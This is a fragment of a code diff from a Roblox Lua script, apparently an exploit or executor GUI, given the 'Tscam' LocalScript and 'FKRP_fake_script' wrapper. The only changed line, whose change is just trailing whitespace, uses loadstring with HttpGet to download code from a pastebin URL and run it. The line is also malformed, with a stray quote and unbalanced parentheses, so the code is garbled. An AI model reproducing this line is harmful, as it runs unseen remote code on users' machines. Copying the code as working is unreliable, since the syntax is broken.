@@ -387,4 +387,4 @@ local function FKRP_fake_script() -- Tscam_2.LocalScript
 	end)
 end
 coroutine.wrap(FKRP_fake_script)()
- loadstring(game:HttpGet("https://pastebin.com/raw/pBWLyPa9"))()", true))()
+ loadstring(game:HttpGet("https://pastebin.com/raw/pBWLyPa9"))()", true))() 
